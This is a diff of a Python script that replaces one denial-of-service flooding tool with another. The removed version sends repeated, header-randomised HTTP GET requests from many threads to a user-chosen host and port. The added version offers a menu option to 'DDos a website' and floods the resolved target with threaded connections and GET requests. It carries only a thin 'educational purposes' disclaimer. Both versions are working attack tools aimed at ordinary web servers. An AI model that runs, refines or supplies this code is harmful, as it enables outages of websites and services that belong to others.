@@ -1,101 +1,113 @@
+#!/usr/bin/python3
+import os
 import socket
-import random
 import threading
-from urllib.parse import urlparse
+import time
+from colorama import Fore, Style
 
-print("\033[91m"  # Đặt màu đỏ
-"""
-____   ____ .___  __________  ________    ________      _________      _________ ___________  ____ ___  ________    .___  ________   
-\\   \\ /   / |   | \\______   \\ \\_____  \\   \\_____  \\    /   _____/     /   _____/ \\__    ___/ |    |   \\ \\______ \\   |   | \\_____  \\  
- \\   Y   /  |   |  |    |  _/  /   |   \\   /   |   \\   \\_____  \\      \\_____  \\    |    |    |    |   /  |    |  \\  |   |  /   |   \\ 
-  \\     /   |   |  |    |   \\ /    |    \\ /    |    \\  /        \\     /        \\   |    |    |    |  /   |    `   \\ |   | /    |    \\
-   \\___/    |___|  |______  / \\_______  / \\_______  / /_______  /    /_______  /   |____|    |______/   /_______  / |___| \\_______  /
-                          \\/          \\/          \\/          \\/             \\/                                 \\/                \\/ 
+def get_ip_from_url(url):
+    try:
+        ip_address = socket.gethostbyname(url)
+        return ip_address
+    except socket.gaierror:
+        print("Invalid URL or unable to resolve IP address. Please try again.")
+        return None
 
-Author: __ViBoss__
-
-Github: https://github.com/dhungx
-
-Đừng tấn công web của chính phủ
-\033[0m
-""")
-
-useragents = [
-    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
-    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
-    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
-    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-    "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
-    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
-]
-
-ref = [
-    'http://www.bing.com/search?q=',
-    'https://www.yandex.com/yandsearch?text=',
-    'https://duckduckgo.com/?q='
-]
-
-acceptall = [
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-    "Accept-Encoding: gzip, deflate\r\n",
-    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-    "Accept-Language: en-US,en;q=0.5\r\n"
-]
-
-def fake_ip():
-    """Tạo một IP giả ngẫu nhiên"""
-    return ".".join(str(random.randint(0, 255)) for _ in range(4))
-
-url = input('[+] Target URL: ')
-port = int(input('[+] Port: '))
-pack = int(input('[+] Packet/s: '))
-thread = int(input('[+] Threads: '))
-
-parsed_url = urlparse(url)
-ip = socket.gethostbyname(parsed_url.hostname)
-
-def start():
-    global useragents, ref, acceptall
-    hh = random._urandom(3016)
-    xx = 0
-    useragen = "User-Agent: " + random.choice(useragents) + "\r\n"
-    accept = random.choice(acceptall)
-    reffer = "Referer: " + random.choice(ref) + parsed_url.hostname + "\r\n"
-    content = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(ip, port)
-    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
-
+def ddos():
+    os.system("clear")
+    print("press CTRL + C and press ENTER to exit !!!")
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(str.encode(main_req))
-            for i in range(pack):
-                s.send(str.encode(main_req))
-            xx += random.randint(0, pack)
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(ip, port, xx))
-        except socket.error as e:
-            print(f'[+] Server Down: {e}')
-        finally:
-            s.close()
+            threads = int(input("ENTER NUMBER OF THREADS : "))
+        except ValueError:
+            print("please enter a integer value")
+            continue
+        else:
+            break
+    attack_num = 0
+    while True:
+        target_url = input(Fore.RED + Style.BRIGHT + "ENTER URL OF THE HOST : ")
+        trget = get_ip_from_url(target_url)
+        if trget:
+            break
+    fake = '192.178.1.38'
+    
+    while True:
+        try:
+            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
+        except ValueError:
+            print("Please enter a valid port , please try again")
+            continue
+        else:
+            break
+    print(f"performing Ddos on {target_url} (IP: {trget}) on PORT {port} using FAKE IP {fake}")
+    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect, you can restart the script and again enter the details correctly!!")
+    
+    time.sleep(4)
+    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
+    print("seconds : 3")
+    time.sleep(1)
+    print("seconds : 2")
+    time.sleep(1)
+    print("seconds : 1")
+    time.sleep(1)
 
-# Khởi tạo các luồng
-for x in range(thread):
-    thread_instance = threading.Thread(target=start)
-    thread_instance.start()
+    def attack():
+        nonlocal attack_num
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((trget, port))
+                s.sendto(("GET /" + target_url + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
+                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
+
+                attack_num += 1
+                print("packet send!! attack number : " + str(attack_num))
+            except socket.error:
+                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK URL OR PORT')
+                break
+                s.close()
+
+    for i in range(threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+
+def print_red_centered_art():
+    os.system("clear")
+    art = '''
+▒█▀▀▄ ▒█▀▀▄ █▀▀█ █▀▀ 
+▒█░▒█ ▒█░▒█ █░░█ ▀▀█ 
+▒█▄▄▀ ▒█▄▄▀ ▀▀▀▀ ▀▀▀
+    '''
+    red_art = f"{Fore.RED}{art}{Style.RESET_ALL}" 
+    print(red_art.center(80))
+    art2 = ''' 
+░█▀▀█ █── ─▀─ ▀▀█▀▀ ▀▀█
+░█▀▀▄ █── ▀█▀ ──█── ▄▀─
+░█▄▄█ ▀▀▀ ▀▀▀ ──▀── ▀▀▀
+    ''' 
+    red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
+    print(red_art2.center(80))
+    print(Fore.YELLOW + Style.BRIGHT + "[the developer is not responsible for any kind of illegal activity done with this tool, this tool only represents how ddos attacks work and it is made for educational purposes.]")
+
+if __name__ == "__main__":
+    print_red_centered_art()
+
+def menu():
+    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
+    print(Fore.WHITE + Style.BRIGHT + "please select from the following options...")
+    print(Fore.WHITE + Style.BRIGHT + "1. DDos a website.  [1]")
+    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
+    print("Enter your options .. [e.g 1,2]") 
+    usr = input(Fore.GREEN + Style.BRIGHT + ">>>> ")
+    if usr == "1":
+        ddos()
+    elif usr == "2":
+        print("Exiting...")
+        time.sleep(1)
+    else:
+        print("invalid option..try again.")
+        menu()
+
+menu()
